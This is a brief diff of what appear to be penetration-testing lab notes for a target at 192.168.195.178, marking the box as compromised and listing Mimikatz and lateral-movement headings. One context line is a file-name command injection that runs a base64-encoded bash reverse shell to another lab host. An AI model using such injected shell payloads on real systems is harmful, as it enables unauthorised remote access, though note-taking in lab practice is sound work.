@@ -1,4 +1,4 @@
-#InProgress 
+#Pwned! 
 ```IP
 192.168.195.178
 ```
@@ -37,3 +37,4 @@ cp test.png '|test"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNy84MCAwPiY
 ### Mimikatz
 
 # Lateral Movement
+
